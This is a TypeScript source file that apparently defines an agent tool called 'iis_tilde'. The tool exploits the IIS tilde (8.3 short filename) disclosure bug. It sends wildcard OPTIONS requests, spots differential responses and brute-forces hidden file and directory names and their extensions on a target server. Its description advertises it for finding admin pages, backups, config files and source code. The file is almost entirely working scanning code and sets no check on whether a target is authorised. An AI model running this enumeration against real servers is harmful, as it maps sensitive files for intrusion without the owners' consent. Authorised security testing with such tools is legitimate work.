import z from "zod"
import { Tool } from "../../tool"
import { webhookContext, toolResult, toolError } from "../define"
import type { HttpSender } from "../transport"

export namespace IisTilde {
  const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789_".split("")
  const EXT_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789".split("")

  export interface Result {
    vulnerable: boolean
    names: string[]
    requests: number
  }

  async function probe(sender: HttpSender, origin: string, pattern: string): Promise<number | null> {
    const res = await sender.send({
      method: "OPTIONS",
      url: `${origin}/${pattern}`,
      headers: {},
    })
    if ("error" in res) return null
    return res.status
  }

  export async function run(origin: string, sender: HttpSender): Promise<Result> {
    let requests = 0

    const [valid, invalid] = await Promise.all([
      probe(sender, origin, "*~1*/.aspx"),
      probe(sender, origin, "1234567890*~1*/.aspx"),
    ])
    requests += 2

    if (valid === null || invalid === null || valid === invalid)
      return { vulnerable: false, names: [], requests }

    const baseline = invalid

    async function enumerate(prefix: string, depth: number): Promise<string[]> {
      if (depth > 6) return [prefix]
      const found: string[] = []
      for (const ch of CHARS) {
        const status = await probe(sender, origin, `${prefix}${ch}*~1*/.aspx`)
        requests++
        if (status !== null && status !== baseline) {
          const deeper = await enumerate(prefix + ch, depth + 1)
          found.push(...deeper)
        }
      }
      if (found.length === 0 && prefix.length > 0) return [prefix]
      return found
    }

    const prefixes = await enumerate("", 1)

    const names: string[] = []
    for (const p of prefixes) {
      const exts = await extensions(p, sender, origin, baseline)
      requests += exts.requests
      names.push(...exts.names)
    }

    return { vulnerable: true, names, requests }
  }

  async function extensions(
    prefix: string,
    sender: HttpSender,
    origin: string,
    baseline: number,
  ): Promise<{ names: string[]; requests: number }> {
    let requests = 0

    async function recurse(ext: string, depth: number): Promise<string[]> {
      if (depth > 3) return [ext]
      const found: string[] = []
      for (const ch of EXT_CHARS) {
        const status = await probe(sender, origin, `${prefix}~1.${ext}${ch}*/.aspx`)
        requests++
        if (status !== null && status !== baseline) {
          const deeper = await recurse(ext + ch, depth + 1)
          found.push(...deeper)
        }
      }
      if (found.length === 0 && ext.length > 0) return [ext]
      return found
    }

    const has = await probe(sender, origin, `${prefix}~1.*/.aspx`)
    requests++
    if (has === null || has === baseline)
      return { names: [`${prefix}~1.*`], requests }

    const exts = await recurse("", 1)
    return {
      names: exts.map((e) => `${prefix}~1.${e}`),
      requests,
    }
  }
}

const DESCRIPTION = `IIS tilde (~) short filename enumeration. Exploits the Windows 8.3 filename disclosure bug to discover hidden files and directories on IIS servers.

Sends OPTIONS requests with wildcard patterns (e.g. /a*~1*/.aspx) and detects differential responses that reveal 8.3 short names. Fully algorithmic — brute-forces each character position (a-z, 0-9) up to the 8.3 limit (6+3 chars).

**When to use:** After Vortex fingerprints IIS, or when Server header reveals Microsoft-IIS.
**What it finds:** Hidden admin pages, backup files, config files, source code — anything with an 8.3 name.
**Output:** List of discovered short filenames (e.g. BACKUP~1.ZIP, CONFIG~1.BAK).`

export const IisTildeTool = Tool.define("iis_tilde", {
  description: DESCRIPTION,
  parameters: z.object({
    origin: z.string().describe("Target IIS origin (e.g. https://target.com)."),
  }),
  async execute(params, ctx) {
    const wctx = webhookContext(ctx)
    const result = await IisTilde.run(params.origin, wctx.sender)
    if (!result.vulnerable)
      return toolResult("iis_tilde", "not vulnerable (no differential response)", result)
    return toolResult("iis_tilde", `${result.names.length} short name(s) found in ${result.requests} requests`, result)
  },
})
